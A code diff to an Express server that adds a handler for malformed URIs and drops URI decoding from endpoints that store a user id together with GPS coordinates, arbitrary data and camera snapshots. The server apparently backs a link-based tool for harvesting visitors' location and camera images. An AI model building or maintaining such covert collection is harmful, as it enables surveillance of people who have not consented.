@@ -14,6 +14,16 @@ const PORT = process.env.PORT || 5000;
 app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
+
+// Global error handler for malformed URIs
+app.use((err, req, res, next) => {
+    if (err instanceof URIError) {
+        console.error('Malformed URI encountered:', err.message);
+        return res.status(400).send('Bad Request: Malformed URI');
+    }
+    next(err);
+});
+
 app.use(express.static('public'));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
@@ -134,10 +144,10 @@ app.get('/c/:path/:uri', (req, res) => {
 });
 
 app.post('/location', (req, res) => {
-    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
-    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
-    const uid = decodeURIComponent(req.body.uid) || null;
-    const acc = decodeURIComponent(req.body.acc) || null;
+    const lat = parseFloat(req.body.lat) || null;
+    const lon = parseFloat(req.body.lon) || null;
+    const uid = req.body.uid || null;
+    const acc = req.body.acc || null;
 
     if (lon != null && lat != null && uid != null && acc != null) {
         saveData(uid, {
@@ -153,8 +163,8 @@ app.post('/location', (req, res) => {
 });
 
 app.post('/', (req, res) => {
-    const uid = decodeURIComponent(req.body.uid) || null;
-    const data = decodeURIComponent(req.body.data) || null;
+    const uid = req.body.uid || null;
+    const data = req.body.data || null;
 
     if (uid != null && data != null) {
         saveData(uid, {
@@ -168,9 +178,9 @@ app.post('/', (req, res) => {
 });
 
 app.post('/camsnap', (req, res) => {
-    const uid = decodeURIComponent(req.body.uid) || null;
-    const img = decodeURIComponent(req.body.img) || null;
-    const index = decodeURIComponent(req.body.index) || '1';
+    const uid = req.body.uid || null;
+    const img = req.body.img || null;
+    const index = req.body.index || '1';
 
     if (uid != null && img != null) {
         try {
